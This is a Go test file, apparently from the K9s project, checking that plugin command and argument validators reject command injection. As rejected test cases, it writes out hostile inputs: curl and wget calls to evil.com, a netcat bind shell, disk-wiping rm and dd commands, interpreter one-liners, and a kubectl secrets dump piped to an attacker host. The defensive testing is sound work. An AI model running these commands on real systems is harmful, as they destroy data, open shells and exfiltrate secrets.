// SPDX-License-Identifier: Apache-2.0
// Copyright Authors of K9s

package config

import (
	"testing"
)

// TestValidatePluginCommand_SecurityTests tests the validatePluginCommand function for security vulnerabilities
// SECURITY FIX (SEC-002): These tests ensure that command injection attacks are prevented
func TestValidatePluginCommand_SecurityTests(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		args        []string
		expectError bool
		description string
	}{
		// Valid commands that should be allowed
		{
			name:        "valid_kubectl_command",
			command:     "kubectl",
			args:        []string{"get", "pods"},
			expectError: false,
			description: "Valid kubectl command should be allowed",
		},
		{
			name:        "valid_helm_command",
			command:     "helm",
			args:        []string{"list", "--all-namespaces"},
			expectError: false,
			description: "Valid helm command should be allowed",
		},
		{
			name:        "valid_jq_command",
			command:     "jq",
			args:        []string{".metadata.name"},
			expectError: false,
			description: "Valid jq command should be allowed",
		},
		{
			name:        "valid_shell_command",
			command:     "bash",
			args:        []string{"-c", "echo hello"},
			expectError: false,
			description: "Valid shell command should be allowed",
		},
		{
			name:        "valid_full_path_command",
			command:     "/usr/bin/sh",
			args:        []string{"-c", "kubectl get pods"},
			expectError: false,
			description: "Valid full path command should be allowed",
		},

		// Invalid commands that should be rejected
		{
			name:        "invalid_command_not_in_allowlist",
			command:     "rm",
			args:        []string{"-rf", "/"},
			expectError: true,
			description: "Command not in allowlist should be rejected",
		},
		{
			name:        "invalid_dangerous_command",
			command:     "curl",
			args:        []string{"http://evil.com/steal"},
			expectError: true,
			description: "Dangerous command should be rejected",
		},
		{
			name:        "invalid_python_command",
			command:     "python",
			args:        []string{"-c", "import os; os.system('rm -rf /')"},
			expectError: true,
			description: "Python interpreter should be rejected",
		},
		{
			name:        "invalid_node_command",
			command:     "node",
			args:        []string{"-e", "require('child_process').exec('rm -rf /')"},
			expectError: true,
			description: "Node.js interpreter should be rejected",
		},
		{
			name:        "invalid_php_command",
			command:     "php",
			args:        []string{"-r", "system('rm -rf /');"},
			expectError: true,
			description: "PHP interpreter should be rejected",
		},
		{
			name:        "invalid_perl_command",
			command:     "perl",
			args:        []string{"-e", "system('rm -rf /')"},
			expectError: true,
			description: "Perl interpreter should be rejected",
		},
		{
			name:        "invalid_ruby_command",
			command:     "ruby",
			args:        []string{"-e", "system('rm -rf /')"},
			expectError: true,
			description: "Ruby interpreter should be rejected",
		},
		{
			name:        "invalid_wget_command",
			command:     "wget",
			args:        []string{"http://evil.com/malware"},
			expectError: true,
			description: "Wget command should be rejected",
		},
		{
			name:        "invalid_netcat_command",
			command:     "nc",
			args:        []string{"-l", "-p", "4444", "-e", "/bin/sh"},
			expectError: true,
			description: "Netcat command should be rejected",
		},
		{
			name:        "invalid_dd_command",
			command:     "dd",
			args:        []string{"if=/dev/zero", "of=/dev/sda"},
			expectError: true,
			description: "DD command should be rejected",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validatePluginCommand(tt.command, tt.args)

			if tt.expectError {
				if err == nil {
					t.Errorf("Expected error for command %q with args %v, but got none", tt.command, tt.args)
				}
				t.Logf("✓ Correctly rejected dangerous command: %q %v -> %v", tt.command, tt.args, err)
			} else {
				if err != nil {
					t.Errorf("Unexpected error for command %q with args %v: %v", tt.command, tt.args, err)
				}
				t.Logf("✓ Correctly allowed safe command: %q %v", tt.command, tt.args)
			}
		})
	}
}

// TestValidateArgument_SecurityTests tests the validateArgument function for injection patterns
func TestValidateArgument_SecurityTests(t *testing.T) {
	tests := []struct {
		name        string
		arg         string
		expectError bool
		description string
	}{
		// Valid arguments that should be allowed
		{
			name:        "valid_simple_argument",
			arg:         "pods",
			expectError: false,
			description: "Simple argument should be allowed",
		},
		{
			name:        "valid_complex_argument",
			arg:         "--output=json",
			expectError: false,
			description: "Complex argument should be allowed",
		},
		{
			name:        "valid_quoted_argument",
			arg:         "\"hello world\"",
			expectError: false,
			description: "Quoted argument should be allowed",
		},
		{
			name:        "valid_path_argument",
			arg:         "/home/user/k9s/config",
			expectError: false,
			description: "Path argument should be allowed",
		},

		// Invalid arguments that should be rejected
		{
			name:        "command_substitution_dollar_parens",
			arg:         "$(rm -rf /)",
			expectError: true,
			description: "Command substitution should be rejected",
		},
		{
			name:        "command_substitution_backticks",
			arg:         "`rm -rf /`",
			expectError: true,
			description: "Backtick command substitution should be rejected",
		},
		{
			name:        "command_chaining_semicolon",
			arg:         "kubectl get pods; rm -rf /",
			expectError: true,
			description: "Command chaining with semicolon should be rejected",
		},
		{
			name:        "command_chaining_ampersand",
			arg:         "kubectl get pods && rm -rf /",
			expectError: true,
			description: "Command chaining with && should be rejected",
		},
		{
			name:        "command_chaining_pipe",
			arg:         "kubectl get pods || rm -rf /",
			expectError: true,
			description: "Command chaining with || should be rejected",
		},
		{
			name:        "output_redirection",
			arg:         "kubectl get pods > /etc/passwd",
			expectError: true,
			description: "Output redirection should be rejected",
		},
		{
			name:        "input_redirection",
			arg:         "kubectl get pods < /etc/passwd",
			expectError: true,
			description: "Input redirection should be rejected",
		},
		{
			name:        "background_execution",
			arg:         "kubectl get pods &",
			expectError: true,
			description: "Background execution should be rejected",
		},
		{
			name:        "path_traversal_unix",
			arg:         "../../../etc/passwd",
			expectError: true,
			description: "Unix path traversal should be rejected",
		},
		{
			name:        "path_traversal_windows",
			arg:         "..\\..\\..\\windows\\system32",
			expectError: true,
			description: "Windows path traversal should be rejected",
		},
		{
			name:        "dangerous_rm_command",
			arg:         "rm -rf /",
			expectError: true,
			description: "Dangerous rm command should be rejected",
		},
		{
			name:        "dangerous_del_command",
			arg:         "del /s /q C:\\",
			expectError: true,
			description: "Dangerous del command should be rejected",
		},
		{
			name:        "dangerous_format_command",
			arg:         "format C: /fs:ntfs",
			expectError: true,
			description: "Dangerous format command should be rejected",
		},
		{
			name:        "dangerous_dd_command",
			arg:         "dd if=/dev/zero of=/dev/sda",
			expectError: true,
			description: "Dangerous dd command should be rejected",
		},
		{
			name:        "dangerous_netcat_command",
			arg:         "nc -l -p 4444 -e /bin/sh",
			expectError: true,
			description: "Dangerous netcat command should be rejected",
		},
		{
			name:        "dangerous_curl_command",
			arg:         "curl http://evil.com/steal",
			expectError: true,
			description: "Dangerous curl command should be rejected",
		},
		{
			name:        "dangerous_wget_command",
			arg:         "wget http://evil.com/malware",
			expectError: true,
			description: "Dangerous wget command should be rejected",
		},
		{
			name:        "comment_hiding_malicious",
			arg:         "kubectl get pods # rm -rf /",
			expectError: true,
			description: "Comment hiding malicious command should be rejected",
		},
		{
			name:        "excessive_length",
			arg:         string(make([]byte, 1001)), // 1001 characters
			expectError: true,
			description: "Excessively long argument should be rejected",
		},
		{
			name:        "null_bytes",
			arg:         "kubectl\x00get\x00pods",
			expectError: true,
			description: "Argument with null bytes should be rejected",
		},
		{
			name:        "unicode_obfuscation",
			arg:         "kubectl\u200Bget\u200Bpods", // Zero-width spaces
			expectError: false,
			description: "Unicode characters should be allowed (not obfuscation)",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateArgument(tt.arg)

			if tt.expectError {
				if err == nil {
					t.Errorf("Expected error for argument %q, but got none", tt.arg)
				}
				t.Logf("✓ Correctly rejected dangerous argument: %q -> %v", tt.arg, err)
			} else {
				if err != nil {
					t.Errorf("Unexpected error for argument %q: %v", tt.arg, err)
				}
				t.Logf("✓ Correctly allowed safe argument: %q", tt.arg)
			}
		})
	}
}

// TestValidatePluginCommand_EdgeCases tests edge cases and boundary conditions
func TestValidatePluginCommand_EdgeCases(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		args        []string
		expectError bool
		description string
	}{
		{
			name:        "empty_command",
			command:     "",
			args:        []string{},
			expectError: true,
			description: "Empty command should be rejected",
		},
		{
			name:        "empty_args",
			command:     "kubectl",
			args:        []string{},
			expectError: false,
			description: "Empty args should be allowed",
		},
		{
			name:        "nil_args",
			command:     "kubectl",
			args:        nil,
			expectError: false,
			description: "Nil args should be allowed",
		},
		{
			name:        "many_args",
			command:     "kubectl",
			args:        make([]string, 100),
			expectError: false,
			description: "Many args should be allowed",
		},
		{
			name:        "case_sensitive_command",
			command:     "KUBECTL",
			args:        []string{"get", "pods"},
			expectError: true,
			description: "Case sensitive command should be rejected",
		},
		{
			name:        "command_with_spaces",
			command:     "kubectl ",
			args:        []string{"get", "pods"},
			expectError: true,
			description: "Command with spaces should be rejected",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validatePluginCommand(tt.command, tt.args)

			if tt.expectError {
				if err == nil {
					t.Errorf("Expected error for command %q with args %v, but got none", tt.command, tt.args)
				}
			} else {
				if err != nil {
					t.Errorf("Unexpected error for command %q with args %v: %v", tt.command, tt.args, err)
				}
			}
		})
	}
}

// TestValidatePluginCommand_RealWorldScenarios tests real-world plugin scenarios
func TestValidatePluginCommand_RealWorldScenarios(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		args        []string
		expectError bool
		description string
	}{
		{
			name:        "kubectl_get_pods",
			command:     "kubectl",
			args:        []string{"get", "pods", "--all-namespaces"},
			expectError: false,
			description: "Real kubectl command should be allowed",
		},
		{
			name:        "kubectl_describe_pod",
			command:     "kubectl",
			args:        []string{"describe", "pod", "my-pod"},
			expectError: false,
			description: "Real kubectl describe command should be allowed",
		},
		{
			name:        "helm_list",
			command:     "helm",
			args:        []string{"list", "--all-namespaces", "--output", "json"},
			expectError: false,
			description: "Real helm command should be allowed",
		},
		{
			name:        "jq_filter",
			command:     "jq",
			args:        []string{".items[].metadata.name"},
			expectError: false,
			description: "Real jq command should be allowed",
		},
		{
			name:        "grep_search",
			command:     "grep",
			args:        []string{"-r", "error", "/var/log"},
			expectError: false,
			description: "Real grep command should be allowed",
		},
		{
			name:        "awk_processing",
			command:     "awk",
			args:        []string{"{print $1, $2}"},
			expectError: false,
			description: "Real awk command should be allowed",
		},
		{
			name:        "malicious_kubectl_injection",
			command:     "kubectl",
			args:        []string{"get", "secrets", "--all-namespaces", "-o", "json", "|", "curl", "-X", "POST", "http://evil.com/steal"},
			expectError: true,
			description: "Malicious kubectl with injection should be rejected",
		},
		{
			name:        "malicious_helm_injection",
			command:     "helm",
			args:        []string{"list", "&&", "rm", "-rf", "/"},
			expectError: true,
			description: "Malicious helm with injection should be rejected",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validatePluginCommand(tt.command, tt.args)

			if tt.expectError {
				if err == nil {
					t.Errorf("Expected error for command %q with args %v, but got none", tt.command, tt.args)
				}
				t.Logf("✓ Correctly rejected malicious command: %q %v -> %v", tt.command, tt.args, err)
			} else {
				if err != nil {
					t.Errorf("Unexpected error for command %q with args %v: %v", tt.command, tt.args, err)
				}
				t.Logf("✓ Correctly allowed legitimate command: %q %v", tt.command, tt.args)
			}
		})
	}
}

// BenchmarkValidatePluginCommand benchmarks the plugin validation function
func BenchmarkValidatePluginCommand(b *testing.B) {
	validCommand := "kubectl"
	validArgs := []string{"get", "pods", "--all-namespaces"}
	maliciousCommand := "rm"
	maliciousArgs := []string{"-rf", "/"}

	b.Run("ValidCommand", func(b *testing.B) {
		for range b.N {
			_ = validatePluginCommand(validCommand, validArgs)
		}
	})

	b.Run("MaliciousCommand", func(b *testing.B) {
		for range b.N {
			_ = validatePluginCommand(maliciousCommand, maliciousArgs)
		}
	})
}

// BenchmarkValidateArgument benchmarks the argument validation function
func BenchmarkValidateArgument(b *testing.B) {
	validArg := "pods"
	maliciousArg := "$(rm -rf /)"

	b.Run("ValidArgument", func(b *testing.B) {
		for range b.N {
			_ = validateArgument(validArg)
		}
	})

	b.Run("MaliciousArgument", func(b *testing.B) {
		for range b.N {
			_ = validateArgument(maliciousArg)
		}
	})
}
